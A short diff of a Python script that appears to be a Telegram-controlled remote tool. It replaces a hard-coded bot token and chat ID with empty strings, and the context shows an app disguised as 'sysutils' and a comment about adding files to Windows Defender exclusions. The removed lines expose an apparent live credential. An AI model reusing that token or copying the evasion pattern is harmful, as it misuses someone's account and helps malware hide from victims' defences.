@@ -23,8 +23,8 @@ from cryptography.fernet import Fernet
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Your bot configuration
-token = '8392562120:AAH0F1jdpHzqwNL-wJh3ky2yJjQQ_KNaUHQ'  # Replace with actual token
-known_ids = ['6644071242']  # Replace with your numeric chat ID
+token = ''  # Replace with actual token
+known_ids = ['']  # Replace with your numeric chat ID
 appname='sysutils'
 
 #Add a single file to Windows Defender exclusions
@@ -330,3 +330,4 @@ if __name__ == "__main__":
 	# Keep the script running
 	while True:
 		time.sleep(10)#!/usr/bin/env python
+
